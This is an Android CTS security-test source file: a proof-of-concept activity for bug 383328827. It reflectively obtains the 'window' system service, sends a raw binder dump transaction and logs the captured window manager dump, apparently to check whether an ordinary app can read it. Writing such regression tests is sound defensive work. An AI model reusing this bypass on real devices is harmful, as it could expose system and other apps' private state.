/*
 * Copyright (C) 2025 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.bug_383328827;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.InvocationTargetException;

public class PocActivity extends Activity {
    public static String sTag = "wms-poc";
    public static String capturedOutput = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        usingBinder();
    }

    private void usingBinder() {
        int dumpTransaction = ('_' << 24) | ('D' << 16) | ('M' << 8) | 'P';
        IBinder iBinder = null;

        try {
            Class sm = Class.forName("android.os.ServiceManager");
            iBinder =
                    (IBinder)
                            sm.getDeclaredMethod("getService", String.class).invoke(null, "window");
            Log.d(sTag, iBinder.getInterfaceDescriptor());

            ParcelFileDescriptor[] sockets = ParcelFileDescriptor.createReliableSocketPair();
            ParcelFileDescriptor socketIn = sockets[0];
            ParcelFileDescriptor socketOut = sockets[1];

            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();

            data.writeFileDescriptor(socketOut.getFileDescriptor());
            data.writeStringArray(new String[] {"--dump-priority", "HIGH"});
            data.setDataPosition(0);
            iBinder.transact(dumpTransaction, data, reply, 0);

            InputStream inputStream = new FileInputStream(socketIn.getFileDescriptor());
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int b;
            while ((b = inputStream.read()) != -1) {
                baos.write(b);
            }
            capturedOutput = baos.toString();
            Log.d(sTag, "Captured Output: " + capturedOutput);

            socketIn.close();
            socketOut.close();

        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        } catch (RemoteException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
